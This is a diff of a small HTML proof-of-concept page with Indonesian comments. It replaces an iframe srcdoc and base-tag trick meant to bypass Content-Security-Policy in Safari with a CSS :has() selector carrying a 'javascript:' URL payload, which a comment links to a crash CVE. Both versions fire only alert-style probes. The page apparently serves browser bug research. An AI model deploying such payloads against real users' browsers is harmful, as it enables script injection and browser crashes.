@@ -1,20 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head><meta http-equiv="Content-Security-Policy" content="script-src 'self'"></head>
-<body>
-<h2>Base + Srcdoc Bypass - Safari Only</h2>
-<pre id="log"></pre>
+<style>
+/* Ini yang bikin crash di CVE-2025-31215 */
+div:has(> img[src="x"]:not(:has(+ *))){
+  background: url("javascript:alert(document.domain)");
+}
+</style>
+<div><img src="x"><p>Test :has() bypass</p></div>
 <script>
-let log=m=>document.getElementById('log').textContent+=m+"\n";
-
-// Di Chrome: di-block CSP karena base tag ubah origin
-// Di Safari lama: lolos!
-let f=document.createElement('iframe');
-f.srcdoc=`<base href="https://0x403for.github.io/"><script>alert('Safari Bypass: '+document.domain)<\/script>`;
-document.body.appendChild(f);
-
-log("Kalau di Chrome: no alert (CSP block)");
-log("Kalau di Safari: alert muncul = BUG CSP BYPASS");
+console.log("Kalau Safari crash atau alert muncul = BUG valid CVE style");
 </script>
-</body>
-</html>
